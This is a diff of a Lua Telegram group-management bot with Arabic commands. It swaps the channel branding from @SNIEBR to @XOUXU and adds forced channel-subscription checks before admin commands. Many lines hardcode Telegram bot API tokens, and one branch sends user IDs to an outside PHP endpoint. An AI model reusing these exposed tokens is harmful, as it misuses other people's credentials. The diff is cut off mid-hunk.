@@ -4,7 +4,7 @@
 \___ \| '_ \| |/ _ \ '_ \| '__|
  ___) | | | | |  __/ |_) | |
 |____/|_| |_|_|\___|_.__/|_|
-           CH > @SNIEBRTEAM
+           CH > @XOUXUTEAM
 --]]
 --------------------------------------
 serpent = (loadfile  "./libs/serpent.lua")()
@@ -1094,12 +1094,22 @@ return false
 end
 end
 if text == 'اضف رد' and is_mod(msg) then
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
+return false end
 send(msg.chat_id_, msg.id_, 1, '📜┇ ارسل الكلمة التي تريد اضافتها ', 1, 'md')
 redis:set('SNIEBR:'..bot_id..'keko1'..msg.sender_user_id_..''..msg.chat_id_..'', 'msg')
 return false 
 end
 if text == 'حذف رد' and is_mod(msg) then
-send(msg.chat_id_, msg.id_, 1, '📜┇ ارسل الكلمة التي تريد حذفها ', 1, 'md')
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
+return false end
+send(msg.chat_id_, msg.id_, 1, '☑️┇ ارسل الكلمة التي تريد حذفها ', 1, 'md')
 redis:set('SNIEBR:'..bot_id..'keko1'..msg.sender_user_id_..''..msg.chat_id_..'', 'nomsg')
 return false 
 end
@@ -2086,10 +2096,10 @@ end
 end
 
 if (text == 'تعطيل') and not is_sudo(msg) then
-local res = https.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
--- @SNIEBRFreeON.decode(url)
-if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@SNIEBRfreer.SNIEBR ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
 return false end
 function TSby(extra,result,success)
 info = '👤┇بواسطه ← ['..result.first_name_..'](t.me/'..(result.username_ or 'SNIEBRTEAM')..')\n'
@@ -2138,7 +2148,7 @@ if (text == 'تفعيل') and not is_sudo(msg) then
 local res = https.request('https://SNIEBR.gq/SNIEBR.php?id='..msg.sender_user_id_..'')
 if res then
 if res == 'false' then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
 return 
 false 
 end
@@ -2764,10 +2774,10 @@ return false
 end
 ------------------------------------------------------------------------
 if text == ("رفع مطور") and msg.reply_to_message_id_ then
-local res = https.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
--- @SNIEBRFreeON.decode(url)
-if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@SNIEBRfreer.SNIEBR ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
 return false 
 end
 function promote_by_reply(extra, result, success)
@@ -2784,10 +2794,10 @@ return false
 end
 ------------------------------------------------------------------------
 if text and text:match("^رفع مطور @(.*)$") then
-local res = https.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
--- @SNIEBRFreeON.decode(url)
-if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@SNIEBRfreer.SNIEBR ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
 return false 
 end
 local apmd = {string.match(text, "^(رفع مطور) @(.*)$")}
@@ -2810,10 +2820,10 @@ return false
 end
 ------------------------------------------------------------------------
 if text and text:match("^رفع مطور (%d+)$") then
-local res = https.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
--- @SNIEBRFreeON.decode(url)
-if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@SNIEBRfreer.SNIEBR ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
 return false end
 local apmd = {string.match(text, "^(رفع مطور) (%d+)$")}
 redis:set('SNIEBR:'..bot_id..'sudoo'..apmd[2]..'', 'yes')
@@ -2823,10 +2833,10 @@ return false
 end
 ------------------------------------------------------------------------
 if text == ("حذف مطور") and msg.reply_to_message_id_ then
-local res = https.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
--- @SNIEBRFreeON.decode(url)
-if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@SNIEBRfreer.SNIEBR ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
 return false end
 function demote_by_reply(extra, result, success)
 if not redis:sismember('SNIEBR:'..bot_id..'dev', result.sender_user_id_) then
@@ -2842,10 +2852,10 @@ return false
 end
 ------------------------------------------------------------------------
 if text and text:match("^حذف مطور @(.*)$")  then
-local res = https.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
--- @SNIEBRFreeON.decode(url)
-if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@SNIEBRfreer.SNIEBR ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
 return false end
 local apmd = {string.match(text, "^(حذف مطور) @(.*)$")}
 function demote_by_username(extra, result, success)
@@ -2863,10 +2873,10 @@ return false
 end  
 ------------------------------------------------------------------------
 if text and text:match("^حذف مطور (%d+)$") then
-local res = https.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
--- @SNIEBRFreeON.decode(url)
-if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@SNIEBRfreer.SNIEBR ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
 return false end
 local apmd = {string.match(text, "^(حذف مطور) (%d+)$")}
 redis:del('SNIEBR:'..bot_id..'sudoo'..apmd[2]..'', 'no')
@@ -3073,10 +3083,10 @@ return false
 end
 ------------------------------------------------------------------------
 if text == ("تفعيل الكل") then
-local res = https.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
--- @SNIEBRFreeON.decode(url)
-if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@SNIEBRfreer.SNIEBR ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
 return false 
 end
 local gps = datahmade:smembers('SNIEBR:'..bot_id.."groups") or 0
@@ -3147,10 +3157,10 @@ send(msg.chat_id_, msg.id_, 1, "✔️┇تم تفعيل خاصيه الازرا
 end
 ------------------------------------------------------------------------
 if (text and text == 'تعطيل الانلاين') then
-local res = https.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
--- @SNIEBRFreeON.decode(url)
-if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@SNIEBRfreer.SNIEBR ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
 return false end
 datahmade:del('key_ts'..bot_id)
 send(msg.chat_id_, msg.id_, 1, "⚠┇تم تعطيل خاصيه الازرار الشفافه", 1, 'html')
@@ -3329,10 +3339,10 @@ return false
 end 
 ------------------------------------------------------------------------
 if text == "تفعيل" then
-local res = https.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
--- @SNIEBRFreeON.decode(url)
-if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@SNIEBRfreer.SNIEBR ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
